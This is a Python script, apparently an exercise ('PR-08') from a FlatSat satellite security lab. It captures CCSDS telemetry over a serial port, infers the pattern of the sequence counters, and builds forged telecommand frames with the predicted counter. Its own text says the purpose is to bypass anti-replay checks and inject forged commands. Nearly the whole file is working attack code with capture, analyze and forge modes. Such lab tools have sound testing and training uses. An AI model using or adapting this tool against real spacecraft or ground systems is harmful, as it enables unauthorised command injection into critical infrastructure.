#!/usr/bin/env python3
"""PR-08: CCSDS sequence counter predictor.

Captures TM frames, extracts sequence counters, and predicts the next
valid sequence number. Essential for crafting TC frames that pass
Level 3 anti-replay checks (which reject seq=0 and duplicate seq values).

The FlatSat uses a simple incrementing counter — predicting the next
accepted value lets an attacker inject forged commands.
"""

import json
import sys
import time
from collections import defaultdict

sys.path.insert(0, sys.path[0] or ".")
from ccsds_tools import APIDS, OPCODES, build_tc_frame, parse_frame


def capture_sequences(port: str, duration: float = 15.0) -> list[dict]:
    """Capture frames and extract sequence counters."""
    import serial

    ser = serial.Serial(port, 115200, timeout=1, dsrdtr=False, rtscts=False)
    time.sleep(0.5)
    ser.reset_input_buffer()

    entries = []
    print(f"[*] Capturing sequence numbers on {port} for {duration}s...")

    start = time.time()
    buf = b""

    try:
        while time.time() - start < duration:
            chunk = ser.read(ser.in_waiting or 1)
            if not chunk:
                continue
            buf += chunk

            while b"+RX" in buf:
                idx = buf.index(b"+RX")
                nl = buf.find(b"\n", idx)
                if nl == -1:
                    break
                line = buf[idx:nl].decode(errors="replace").strip()
                buf = buf[nl + 1 :]

                parts = line.split(",", 1)
                if len(parts) == 2:
                    try:
                        frame = bytes.fromhex(parts[1].strip())
                        p = parse_frame(frame)
                        if "seq_count" in p:
                            entry = {
                                "time": time.time() - start,
                                "type": p.get("type", "?"),
                                "apid": p.get("apid", 0),
                                "seq": p["seq_count"],
                                "crc_valid": p.get("crc_valid", False),
                            }
                            entries.append(entry)
                            print(
                                f"  [{entry['time']:.1f}s] {entry['type']} "
                                f"APID=0x{entry['apid']:03X} seq={entry['seq']}"
                            )
                    except ValueError:
                        pass
    except KeyboardInterrupt:
        print("\n[*] Stopped by user")

    ser.close()
    return entries


def analyze_sequences(entries: list[dict]) -> dict:
    """Analyze captured sequences and predict next values."""
    # Group by APID
    by_apid: dict[int, list[int]] = defaultdict(list)
    for e in entries:
        by_apid[e["apid"]].append(e["seq"])

    results = {}

    for apid, seqs in sorted(by_apid.items()):
        print(f"\n[*] APID 0x{apid:03X}: {len(seqs)} frames captured")
        print(f"    Sequences: {seqs[:30]}{'...' if len(seqs) > 30 else ''}")

        if len(seqs) < 2:
            print("    [!] Need at least 2 frames to analyze pattern")
            results[apid] = {"pattern": "unknown", "sequences": seqs}
            continue

        # Calculate increments
        increments = [seqs[i + 1] - seqs[i] for i in range(len(seqs) - 1)]
        # Handle wrap-around at 0x3FFF
        increments = [(d + 0x4000) % 0x4000 if d < 0 else d for d in increments]

        print(f"    Increments: {increments[:20]}{'...' if len(increments) > 20 else ''}")

        # Detect pattern
        unique_inc = set(increments)
        if len(unique_inc) == 1:
            step = increments[0]
            predicted = (seqs[-1] + step) & 0x3FFF
            print(f"    Pattern: LINEAR (step={step})")
            print(f"    Next predicted seq: {predicted}")
            print(f"    Next 5: {[(seqs[-1] + step * (i + 1)) & 0x3FFF for i in range(5)]}")
            results[apid] = {
                "pattern": "linear",
                "step": step,
                "last_seen": seqs[-1],
                "predicted_next": predicted,
            }
        elif max(increments) - min(increments) <= 2:
            avg_step = sum(increments) / len(increments)
            predicted = (seqs[-1] + round(avg_step)) & 0x3FFF
            print(f"    Pattern: NEARLY LINEAR (avg step={avg_step:.1f})")
            print(f"    Next predicted seq: {predicted}")
            results[apid] = {
                "pattern": "nearly_linear",
                "avg_step": avg_step,
                "last_seen": seqs[-1],
                "predicted_next": predicted,
            }
        else:
            print(f"    Pattern: IRREGULAR (min={min(increments)}, max={max(increments)})")
            print("    [!] Sequence may use PRNG — harder to predict")
            results[apid] = {
                "pattern": "irregular",
                "last_seen": seqs[-1],
                "min_inc": min(increments),
                "max_inc": max(increments),
            }

    return results


def generate_forged_frame(predicted_seq: int, opcode_name: str = "PING") -> bytes:
    """Generate a TC frame with the predicted sequence counter."""
    opcode = OPCODES.get(opcode_name.upper(), OPCODES["PING"])
    frame = build_tc_frame(APIDS["TC_COMMAND"], bytes([opcode]), seq=predicted_seq)
    return frame


def from_file(filepath: str):
    """Analyze sequences from a replay_capture.py JSON file."""
    with open(filepath) as f:
        data = json.load(f)

    entries = []
    for frame_entry in data.get("frames", []):
        entries.append(
            {
                "time": 0,
                "type": frame_entry.get("type", "?"),
                "apid": frame_entry.get("apid", 0),
                "seq": frame_entry.get("seq", 0),
                "crc_valid": frame_entry.get("crc_valid", False),
            }
        )

    return analyze_sequences(entries)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage:")
        print("  seq_predict.py capture <port> [duration_sec]")
        print("  seq_predict.py analyze <capture.json>")
        print("  seq_predict.py forge <predicted_seq> [opcode]")
        print()
        print("Capture TM sequence counters, analyze patterns, and predict")
        print("the next valid seq for forging TC frames that bypass anti-replay.")
        sys.exit(1)

    cmd = sys.argv[1]

    if cmd == "capture":
        port = sys.argv[2]
        dur = float(sys.argv[3]) if len(sys.argv) > 3 else 15.0
        entries = capture_sequences(port, dur)
        results = analyze_sequences(entries)

        # Generate forged frames for any predicted sequences
        for _apid, info in results.items():
            if "predicted_next" in info:
                seq = info["predicted_next"]
                frame = generate_forged_frame(seq)
                print(f"\n[+] Forged PING with seq={seq}: {frame.hex()}")

    elif cmd == "analyze":
        from_file(sys.argv[2])

    elif cmd == "forge":
        seq = int(sys.argv[2])
        opcode = sys.argv[3] if len(sys.argv) > 3 else "PING"
        frame = generate_forged_frame(seq, opcode)
        print(f"[*] Forged {opcode} frame with seq={seq}:")
        print(f"    {frame.hex()}")
